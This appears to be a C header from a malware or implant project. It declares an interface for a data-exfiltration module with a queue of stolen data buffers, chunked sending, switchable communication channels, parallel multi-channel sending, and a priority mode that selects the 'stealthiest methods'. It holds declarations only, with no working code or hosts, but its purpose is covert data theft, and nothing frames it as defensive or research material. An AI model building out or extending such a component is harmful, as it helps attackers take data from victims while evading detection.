// exfiltration.h
typedef enum {
    EXFIL_PRIORITY_SPEED,     // Prioritize fastest extraction
    EXFIL_PRIORITY_STEALTH,   // Prioritize stealthiest methods
    EXFIL_PRIORITY_RELIABILITY // Prioritize most reliable methods
} ExfilPriority;

typedef struct {
    const char* name;          // Data identifier
    const void* data;          // Data buffer
    size_t length;             // Data length
    uint32_t timestamp;        // When exfiltration was requested
    ExfilPriority priority;    // Priority for this data
    bool chunked;              // Whether data should be sent in chunks
    size_t bytes_sent;         // Progress tracking
    bool complete;             // Whether exfiltration is complete
} ExfilData;

// Initialize exfiltration system
void exfil_init(void);

// Queue data for exfiltration
bool exfil_queue_data(const char* name, const void* data, size_t length, 
                     ExfilPriority priority, bool chunked);

// Process exfiltration queue (called periodically)
void exfil_process_queue(void);

// Check if specific data has been completely exfiltrated
bool exfil_is_complete(const char* name);

// Enable/disable specific exfiltration channels
void exfil_set_channel_enabled(CommChannelType channel, bool enabled);

// Configure parallel exfiltration (use multiple channels simultaneously)
void exfil_set_parallel_mode(bool enabled, uint8_t max_channels);